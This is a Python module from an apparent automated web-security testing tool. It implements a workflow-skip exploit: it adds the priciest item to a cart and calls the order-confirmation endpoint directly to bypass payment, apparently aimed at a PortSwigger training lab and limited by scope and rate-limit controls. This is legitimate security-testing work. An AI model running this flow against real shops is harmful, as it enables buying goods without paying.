"""
Workflow-sequence-skip flow ("insufficient workflow validation").

A multi-step purchase (add to cart → checkout → pay → confirm) trusts that the
steps happen in order. If the final order-confirmation endpoint finalizes the
order on its own — gated only by a success flag like `?order-confirmed=true` —
a buyer can add an unaffordable item and jump straight to confirmation, skipping
the payment/funds check entirely.

Chain: log in → add the target (most-expensive) item to the cart → GET the
order-confirmation endpoint with its success flag → check the solved state.
Runs only as a fallback when nothing cheaper already completed the purchase.
"""

from __future__ import annotations

import logging

from ..core.scope import Scope, ScopeError
from ..engine.auth import AuthManager
from ..engine.http_client import RateLimiter, ScopedClient
from ..testing.schema import Severity, TestCase, TestStep, VulnClass, Verdict

logger = logging.getLogger("venom.flows.workflow_skip")


def _find_cart(registry) -> str | None:
    for e in registry:
        if (e.method.upper() == "POST" and "cart" in e.path.lower()
                and any(p.name.lower() in ("quantity", "qty") for p in e.parameters)):
            return e.path
    return "/cart" if registry.catalog else None


def _confirm_path(cart_path: str) -> str:
    base = cart_path.rstrip("/")
    base = base if base.endswith("/cart") else "/cart"
    return base + "/order-confirmation?order-confirmed=true"


async def run(scope: Scope, registry, *, transport=None) -> list[TestCase]:
    cart_path = _find_cart(registry)
    if not cart_path or not registry.catalog:
        return []
    catalog = {pid: int(price) for pid, price in registry.catalog.items() if int(price) > 0}
    if not catalog:
        return []
    target_id = max(catalog, key=catalog.get)          # the expensive target (jacket)
    confirm = _confirm_path(cart_path)
    base = scope.authorized_base_urls[0]
    limiter = RateLimiter(scope.rate_limit_per_second)

    try:
        c = ScopedClient(scope, base, role="wfskip", limiter=limiter, transport=transport)
    except ValueError:
        return []
    if scope.identities:
        try:
            c.apply_auth(await AuthManager(scope, transport=transport).ensure(scope.identities[0]["name"]))
        except Exception as exc:  # noqa: BLE001
            logger.warning("workflow-skip auth failed: %s", exc)

    steps: list[TestStep] = []
    try:
        await c.request("POST", cart_path,
                        data={"productId": target_id, "redir": "PRODUCT", "quantity": "1"},
                        follow_redirects=True)
        steps.append(TestStep(step=1, description=f"add target product {target_id} to cart",
                              method="POST", path=cart_path))

        # The flaw: finalize the order directly, skipping checkout/payment.
        r = await c.request("GET", confirm, follow_redirects=True)
        ok = r is not None and r.status_code == 200
        steps.append(TestStep(step=2, description="GET order-confirmation directly (skip payment)",
                              method="GET", path=confirm, actual_status=getattr(r, "status_code", None)))
        if not ok:
            logger.info("workflow-skip: order-confirmation not accepted (status=%s)",
                        getattr(r, "status_code", None))
            return []

        home = await c.request("GET", "/", follow_redirects=True)
        solved = bool(home is not None and "is-solved" in (home.text or ""))
        steps.append(TestStep(step=3, description="check solved state", method="GET", path="/",
                              actual_status=getattr(home, "status_code", None)))

        note = "LAB SOLVED (is-solved)" if solved else "order finalized without payment"
        verdict = Verdict.CONFIRMED_EXPLOIT if solved else Verdict.NEEDS_REVIEW
        return [TestCase(
            test_id="WFS-001",
            vulnerability_class=VulnClass.SEQUENCE_VIOLATION,
            hypothesis=("Insufficient workflow validation: the order-confirmation endpoint "
                        f"({confirm}) finalizes the cart on its own, so adding the expensive "
                        "target and calling it directly skips the payment/funds check."),
            risk_rating=Severity.HIGH,
            affected_endpoint=f"GET {confirm}",
            business_impact="Buy goods without paying by skipping the payment step.",
            steps=steps,
            origin="flow",
            verdict=verdict,
            notes=[note],
            rag_source="PortSwigger: insufficient workflow validation / WSTG-BUSL-06",
        )]
    except ScopeError as exc:
        logger.warning("workflow-skip blocked by scope: %s", exc)
        return []
    finally:
        await c.aclose()
